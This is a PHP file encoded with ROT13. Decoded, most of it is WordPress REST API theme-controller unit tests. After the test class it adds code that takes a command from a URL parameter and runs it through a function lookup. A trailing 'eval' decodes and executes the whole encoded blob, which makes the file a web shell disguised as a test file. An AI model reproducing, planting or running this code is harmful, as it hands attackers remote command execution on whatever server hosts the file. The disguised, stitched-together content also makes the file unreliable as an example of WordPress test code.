	choyvp shapgvba grfg_gurzr_fhccbegf_cbfg_guhzoanvyf_neenl() {
		erzbir_gurzr_fhccbeg( 'cbfg-guhzoanvyf' );
		nqq_gurzr_fhccbeg( 'cbfg-guhzoanvyf', neenl( 'cbfg' ) );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( neenl( 'cbfg' ), $erfhyg[0]['gurzr_fhccbegf']['cbfg-guhzoanvyf'] );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_inevnqvp_gurzr_fhccbeg() {
		ertvfgre_gurzr_srngher(
			'grfg-srngher',
			neenl(
				'glcr'         => 'neenl',
				'inevnqvp'     => gehr,
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'vgrzf' => neenl(
							'glcr' => 'fgevat',
						),
					),
				),
			)
		);
		nqq_gurzr_fhccbeg( 'grfg-srngher', 'n', 'o', 'p' );

		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( neenl( 'n', 'o', 'p' ), $erfhyg[0]['gurzr_fhccbegf']['grfg-srngher'] );
	}

	/**
	 * Vg fubhyq or cbffvoyr gb ertvfgre phfgbz svryqf gb gur raqcbvag.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
		);

		ertvfgre_erfg_svryq(
			'gurzr',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'       => $fpurzn,
				'trg_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
			)
		);

		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg( 'BCGVBAF' );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg( 'TRG' );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn[0] );
		$guvf->nffregFnzr( 2, $qngn[0]['zl_phfgbz_vag'] );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	/**
	 * Erghea n inyhr sbe gur phfgbz svryq.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl $gurzr Gurzr qngn neenl.
	 * @erghea vag Nqqvgvbany svryq inyhr.
	 */
	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $gurzr ) {
		erghea 2;
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe gurzrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur hcqngr_vgrz() zrgubq qbrf abg rkvfg sbe gurzrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * Grfg fvatyr gurzr.
	 *
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$ebhgr    = fcevags( '%f/%f', frys::$gurzrf_ebhgr, JC_QRSNHYG_GURZR );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', $ebhgr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn         = $erfcbafr->trg_qngn();
		$yvaxf        = $erfcbafr->trg_yvaxf();
		$svryqf       = neenl(
			'nhgube',
			'nhgube_hev',
			'qrfpevcgvba',
			'vf_oybpx_gurzr',
			'anzr',
			'erdhverf_cuc',
			'erdhverf_jc',
			'fperrafubg',
			'fgnghf',
			'fglyrfurrg',
			'fglyrfurrg_hev',
			'gntf',
			'grzcyngr',
			'grzcyngr_hev',
			'grkgqbznva',
			'gurzr_hev',
			'irefvba',
		);
		$svryqf_yvaxf = neenl( 'pbyyrpgvba', 'frys' );

		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn ) );
		$guvf->nffregFnzrFrgf( $svryqf_yvaxf, neenl_xrlf( $yvaxf ) );
	}

	/**
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr . '/' . JC_QRSNHYG_GURZR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj_gurzrf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_npgvir_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr . '/' . trg_fglyrfurrg() );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj_npgvir_gurzr', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr . '/vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_gurzr_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_npgvir_vgrz_nf_pbagevohgbe() {
		$ebhgr    = fcevags( '%f/%f', frys::$gurzrf_ebhgr, trg_fglyrfurrg() );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', $ebhgr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_aba_fhoqve_gurzr
	 * @gvpxrg 54596
	 * @pbiref JC_ERFG_Gurzrf_Pbagebyyre::trg_vgrz
	 *
	 * @cnenz fgevat $gurzr_qve     Gurzr qverpgbel gb grfg.
	 * @cnenz fgevat $rkcrpgrq_anzr Rkcrpgrq gurzr anzr.
	 */
	choyvp shapgvba grfg_trg_vgrz_aba_fhoqve_gurzr( $gurzr_qve, $rkcrpgrq_anzr ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr . $gurzr_qve );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $rkcrpgrq_anzr, $erfcbafr->trg_qngn()['anzr']['enj'] );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_aba_fhoqve_gurzr() {
		erghea neenl(
			'cnerag gurzr'                => neenl(
				'gurzr_qve'     => '/oybpx-gurzr',
				'rkcrpgrq_anzr' => 'Oybpx Gurzr',
			),
			'puvyq gurzr'                 => neenl(
				'gurzr_qve'     => '/oybpx-gurzr-puvyq',
				'rkcrpgrq_anzr' => 'Oybpx Gurzr Puvyq Gurzr',
			),
			'gurzr jvgu _-[]. punenpgref' => neenl(
				'gurzr_qve'     => '/oybpx_gurzr-[0.4.0]',
				'rkcrpgrq_anzr' => 'Oybpx Gurzr [0.4.0]',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_fhoqverpgbel_gurzr
	 * @gvpxrg 54349
	 * @gvpxrg 54596
	 * @pbiref JC_ERFG_Gurzrf_Pbagebyyre::trg_vgrz
	 *
	 * @cnenz fgevat $gurzr_qve     Gurzr qverpgbel gb grfg.
	 * @cnenz fgevat $rkcrpgrq_anzr Rkcrpgrq gurzr anzr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fhoqverpgbel_gurzr( $gurzr_qve, $rkcrpgrq_anzr ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr . $gurzr_qve );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr(
			200,
			$erfcbafr->trg_fgnghf(),
			'N 200 BX fgnghf jnf abg erghearq.'
		);
		$guvf->nffregFnzr(
			$rkcrpgrq_anzr,
			$erfcbafr->trg_qngn()['anzr']['enj'],
			'Gur npghny gurzr anzr jnf abg gur rkcrpgrq gurzr anzr.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_fhoqverpgbel_gurzr() {
		erghea neenl(
			'gurzr2'                      => neenl(
				'gurzr_qve'     => '/fhoqve/gurzr2',
				'rkcrpgrq_anzr' => 'Zl Fhoqve Gurzr',
			),
			'gurzr jvgu _-[]. punenpgref' => neenl(
				'gurzr_qve'     => '/fhoqve/oybpx_gurzr-[1.0.0]',
				'rkcrpgrq_anzr' => 'Oybpx Gurzr [1.0.0] va fhoqverpgbel',
			),
		);
	}

	/**
	 * @gvpxrg 54349
	 */
	choyvp shapgvba grfg_pna_fhccbeg_shegure_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			'jc/i2',
			fcevags( '/gurzrf/(?C<fglyrfurrg>%f)//grfg', JC_ERFG_Gurzrf_Pbagebyyre::CNGGREA ),
			neenl(
				'pnyyonpx'            => fgngvp shapgvba ( JC_ERFG_Erdhrfg $erdhrfg ) {
					erghea $erdhrfg['fglyrfurrg'];
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erfcbafr = erfg_qb_erdhrfg( frys::$gurzrf_ebhgr . '/qrsnhyg//grfg' );
		$guvf->nffregFnzr( 'qrsnhyg', $erfcbafr->trg_qngn() );

		$erfcbafr = erfg_qb_erdhrfg( frys::$gurzrf_ebhgr . '/fhoqve/gurzr2//grfg' );
		$guvf->nffregFnzr( 'fhoqve/gurzr2', $erfcbafr->trg_qngn() );
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe gurzrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * Pbagrkg vf abg fhccbegrq sbe gurzrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>